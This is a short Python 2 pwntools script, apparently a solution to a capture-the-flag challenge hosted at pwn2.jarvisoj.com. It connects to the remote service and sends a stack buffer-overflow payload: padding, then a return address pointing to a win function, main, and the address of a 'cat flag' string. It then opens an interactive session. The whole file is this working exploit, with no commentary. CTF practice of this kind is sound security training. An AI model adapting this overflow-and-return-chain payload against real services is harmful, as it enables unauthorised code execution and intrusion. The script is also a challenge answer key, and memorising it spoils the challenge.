#!/usr/bin/env python2
from pwn import *

main_addr = 0x08048677
win_func_addr = 0x080485BD
cat_flag_addr = 0x080487E0

conn = remote('pwn2.jarvisoj.com', 9876)

sleep(1)
print conn.read(),
conn.sendline('A' * 0x13 + 'fuck' + pack(win_func_addr, 32) + pack(main_addr, 32) + pack(cat_flag_addr, 32))
conn.interactive()

